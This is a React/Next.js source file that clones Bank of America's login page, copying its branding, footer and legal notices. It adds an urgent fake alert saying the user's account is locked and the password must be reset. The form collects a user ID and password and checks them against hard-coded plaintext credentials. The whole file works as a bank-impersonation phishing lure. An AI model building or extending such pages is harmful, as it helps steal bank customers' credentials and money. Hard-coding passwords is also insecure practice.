import { useCallback } from "react";
import { Switch, FormControlLabel } from "@mui/material";
import { useRouter } from "next/router";
import { useState } from 'react';

  const LoginError = () => {
    const router = useRouter();
    const [userId, setUserId] = useState('');
    const [password, setPassword] = useState('');
    const allowedUserId = 'jafyson';
    const allowedPassword = 'Password01';

   
    const onButton1Click = (e) => {
      e.preventDefault();
      if (userId === allowedUserId && password === allowedPassword) {
        
        router.push('/account');
      } else {
        router.push('/login-error');
      }
    };

  return (
    <div className="w-full relative bg-wwwbankofamericacom-nero overflow-y-auto flex flex-col items-start justify-start text-center text-base text-wwwbankofamericacom-nero font-wwwbankofamericacom-roboto-regular-14-underline">
      <div className="self-stretch flex-1 flex flex-col items-start justify-start">
        <div className="self-stretch relative bg-staticwebbankofamericacom-monza box-border h-[42px] font-wwwbankofamericacom-arial-bold-16 border-t-[0.8px] border-solid border-staticwebbankofamericacom-linear-carmine-stratos border-b-[0.8px]">
          <div className="absolute w-full top-[0.8px] right-[0px] left-[0px] flex flex-col items-center justify-start pt-0 px-0 pb-[16.4px] box-border">
            <div className="w-[430.4px] overflow-hidden flex flex-row items-start justify-center py-0 px-[191.2px] box-border">
              <b className="relative leading-[42px] [text-shadow:0px_1px_0px_rgba(0,_0,_0,_0.1)]">
                Log In
              </b>
            </div>
          </div>
          <button className="cursor-pointer [border:none] p-0 bg-[transparent] absolute top-[0.8px] left-[0px] w-[42px] h-10 bg-[url('/button@3x.png')] bg-cover bg-no-repeat bg-[top]" />
        </div>
        <div onSubmit={onButton1Click} className="self-stretch flex flex-col items-center justify-start pt-3.5 px-4 pb-5 gap-[18px] text-left text-sm text-wwwbankofamericacom-mine-shaft">
          <div className="w-[412px] bg-wwwbankofamericacom-nero box-border flex flex-row items-start justify-start py-[0.8px] px-4 text-[12.5px] font-wwwbankofamericacom-inter-regular-966 border-[1px] border-solid border-wwwbankofamericacom-crimson">
            <div className="self-stretch flex flex-col items-center justify-center py-0 pr-5 pl-0 z-[1]">
              <div className="bg-secure-bankofamerica-com-auth-forgot-reset-entry-1519199951171875x6432000122070312-default-cherub flex flex-col items-center justify-start pt-4 px-4 pb-8">
                <img
                  className="w-7 relative h-7"
                  alt=""
                  src="/spandataicon.svg"
                />
              </div>
            </div>
            <div className="self-stretch flex-1 flex flex-col items-start justify-start py-[22px] px-0 z-[0]">
              <div className="self-stretch flex flex-col items-start justify-start py-0 pr-[15.4px] pl-0">
                <div className="w-full relative leading-[16px] inline-block max-w-[1149.4000244140625px]">
                  As part of Bank of America's proactive monitoring, we have
                  observed a potential risk related to your account. For your
                  protection, we have locked your access as a precaution and
                  require you to reset your password.
                </div>
              </div>
            </div>
          </div>
          <div className="self-stretch flex flex-col items-center justify-start py-0 px-[3px] gap-[8px] text-staticwebbankofamericacom-cod-gray">
            <div className="self-stretch flex flex-row items-start justify-start gap-[10px]">
              <input
                className="[outline:none] font-wwwbankofamericacom-roboto-regular-14-underline text-base bg-wwwbankofamericacom-nero flex-1 rounded-lg box-border overflow-hidden flex flex-col items-start justify-start pt-[13.6px] px-[10.8px] pb-[14.400000011920929px] text-gray min-h-[44px] border-[1px] border-solid border-staticwebbankofamericacom-swirl"
                placeholder="User ID"
                type="text" value={userId} onChange={(e) => setUserId(e.target.value)}
              />
              <div className="flex flex-col items-start justify-start">
                <div className="w-[49.8px] flex flex-col items-start justify-start pt-0 px-0 pb-[0.8px] box-border">
                  <div className="relative">Save ID</div>
                </div>
                <FormControlLabel
                  className="w-[50px] relative"
                  label="NO"
                  control={<Switch color="primary" />}
                />
              </div>
            </div>
            <input
              className="[outline:none] font-wwwbankofamericacom-roboto-regular-14-underline text-base bg-staticwebbankofamericacom-spring-wood self-stretch rounded-lg box-border overflow-hidden flex flex-col items-start justify-start pt-[13.6px] px-[10.8px] pb-[14.400000011920929px] text-gray min-h-[44px] border-[1px] border-solid border-staticwebbankofamericacom-swirl"
              placeholder="Password"
              type="password" value={password} onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          <button
            className="cursor-pointer [border:none] py-0 px-2.5 bg-staticwebbankofamericacom-lochmara-40 self-stretch rounded-lg overflow-hidden flex flex-row items-center justify-center box-border min-h-[44px]"
            onClick={onButton1Click}
          >
            <img
              className="w-9 relative h-5 overflow-hidden shrink-0 object-cover"
              alt=""
              src="/secure-lockpng@2x.png"
            />
            <div className="relative text-mini leading-[44px] font-wwwbankofamericacom-roboto-regular-14-underline text-wwwbankofamericacom-nero text-center">
              Log In
            </div>
          </button>
          <div className="self-stretch flex flex-row items-start justify-center pt-[11px] px-2.5 pb-[20.8px] gap-[32.1px] text-center text-staticwebbankofamericacom-deep-fir">
            <div className="relative">Forgot ID/Password? </div>
            <div className="relative">Enroll</div>
          </div>
        </div>
        <div className="self-stretch flex flex-col items-center justify-start gap-[8px] text-4xs text-staticwebbankofamericacom-lochmara">
          <div className="flex flex-col items-center justify-start gap-[4px]">
            <div className="w-[407.7px] relative flex items-center h-[9.6px] shrink-0">
              <span className="w-full">
                <span>Locations</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>Contact Us</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>{`Help & Support`}</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>Accessible Banking</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>Privacy</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>Children's Privacy</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
                <span>Security</span>
                <span className="text-staticwebbankofamericacom-go-ben">
                   | 
                </span>
              </span>
            </div>
            <div className="flex flex-row items-start justify-start gap-[7px]">
              <div className="w-[147.3px] relative flex items-center h-[9.6px] shrink-0">
                <span className="w-full">
                  <span>Online Banking Service Agreement</span>
                  <span className="text-staticwebbankofamericacom-go-ben">
                     | 
                  </span>
                </span>
              </div>
              <div className="flex flex-row items-start justify-center pt-0 px-0 pb-[0.8px] border-b-[0.8px] border-dashed border-staticwebbankofamericacom-lochmara">
                <div className="relative">Advertising Practices</div>
              </div>
              <div className="w-[132.2px] relative flex items-center h-[9.6px] shrink-0 text-staticwebbankofamericacom-go-ben">
                <span className="w-full">
                  <span> | </span>
                  <span className="text-staticwebbankofamericacom-lochmara">
                    Careers
                  </span>
                  <span> | </span>
                  <span className="text-staticwebbankofamericacom-lochmara">
                    Your Privacy Choices
                  </span>
                </span>
              </div>
            </div>
          </div>
          <div className="flex flex-col items-center justify-start gap-[2px] text-staticwebbankofamericacom-go-ben">
            <div className="relative">
              <span>Bank of America, N.A. Member FDIC.</span>
              <span className="[text-decoration:underline] text-staticwebbankofamericacom-blue">
                Equal Housing Lender
              </span>
            </div>
            <div className="relative">
              © 2024 Bank of America Corporation. All rights reserved.
            </div>
            <div className="relative [text-decoration:underline] text-staticwebbankofamericacom-blue">
              Patent: patents.bankofamerica.com
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginError;
